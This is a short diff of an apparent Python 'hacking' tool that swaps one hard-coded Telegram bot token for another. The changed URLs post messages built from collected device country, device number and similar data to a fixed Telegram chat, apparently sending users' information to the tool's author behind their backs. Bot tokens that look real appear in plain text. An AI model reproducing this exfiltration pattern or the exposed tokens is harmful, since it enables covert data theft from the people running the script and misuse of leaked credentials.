@@ -84,7 +84,7 @@ def After_ip_Click():
  """)
     print(Fore.GREEN+"[+] waiting for to connecting source... ")
     sleep(1)
-    url= (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
+    url= (f"https://api.telegram.org/bot5350338296:AAExwOP0ssdv3BO6zP4q25Q5p5-DnxcKz6M/sendmessage?chat_id=5046164056&text={msg}")
     debuger ={
 "UrlBox" : url,
 "AgentList":"Internet Explorer", 
@@ -104,7 +104,7 @@ def Get(numbers):
 𝗗𝗘𝗩𝗜𝗖𝗘 Contrary :{a}
 𝗗𝗘𝗩𝗜𝗖𝗘 Number :{numbers}
  """)        
-            url = (f"https://api.telegram.org/bot5219625887:AAHARZqZ7oQe1JmzXIaxqZGsbnNNl3c4gbo/sendmessage?chat_id=5046164056&text={msg}")
+            url = (f"https://api.telegram.org/bot5350338296:AAExwOP0ssdv3BO6zP4q25Q5p5-DnxcKz6M/sendmessage?chat_id=5046164056&text={msg}")
             debuger ={
 "UrlBox" : url,
 "AgentList":"Internet Explorer", 
